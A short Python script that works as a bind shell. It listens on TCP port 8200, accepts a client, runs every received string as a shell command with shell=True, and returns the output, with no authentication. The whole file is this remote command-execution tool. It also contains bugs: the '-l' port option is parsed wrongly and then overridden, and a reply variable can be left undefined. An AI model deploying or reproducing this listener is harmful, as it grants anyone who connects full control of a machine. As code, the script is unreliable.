import subprocess
import socket
import getopt
import sys

def main():
    (option, value) = getopt.getopt(sys.argv[1:], "l")
    for (opt, arg) in option:
        if opt == "-l":
            port = arg
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = ""
    port = 8200
    s.bind((host, port))
    s.listen(5)
    print("Server waiting for client")
    clientsocket, addr = s.accept()

    while True:
        data = clientsocket.recv(1024)
        if data.decode('ascii') == 'exit':
            clientsocket.send('Finished'.encode('ascii'))
            break
        print("Address: %s " % str(addr))
        print("\nReceived correctly: " + data.decode("ascii"))
        result = subprocess.Popen([data], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        stdout, stderr = result.communicate()
        if stdout != "":
            msg = "OK\n"+stdout
        elif stderr != "":
            msg = "ERROR\n"+stderr

        clientsocket.send(msg.encode())

if __name__ == '__main__':
    main()
